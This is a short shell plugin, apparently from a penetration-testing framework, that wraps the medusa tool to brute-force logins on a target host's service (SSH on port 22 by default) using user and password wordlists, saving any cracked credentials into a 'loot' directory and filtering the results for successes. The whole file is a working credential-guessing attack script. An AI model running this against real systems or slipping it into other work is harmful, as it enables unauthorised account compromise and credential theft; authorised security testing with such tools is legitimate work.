PLUGIN_NAME="medusa"

plugin_init() {
  command -v medusa &>/dev/null
}

plugin_run() {
  local target="$1"
  local service="${2:-ssh}"
  local port="${3:-22}"
  local userlist="${BRUTE_USERLIST:-/usr/share/brutex/wordlists/simple-users.txt}"
  local passlist="${BRUTE_PASSLIST:-/usr/share/brutex/wordlists/password.lst}"
  local outdir="$LOOT_DIR/credentials/bruteforce"
  mkdir -p "$outdir"
  medusa -h "$target" -U "$userlist" -P "$passlist" -M "$service" -n "$port" -O "$outdir/medusa-$target-$service.txt" 2>/dev/null
}

plugin_parse_output() {
  local result_file="$1"
  [[ -f "$result_file" ]] && cat "$result_file" | grep -i "success" || true
}
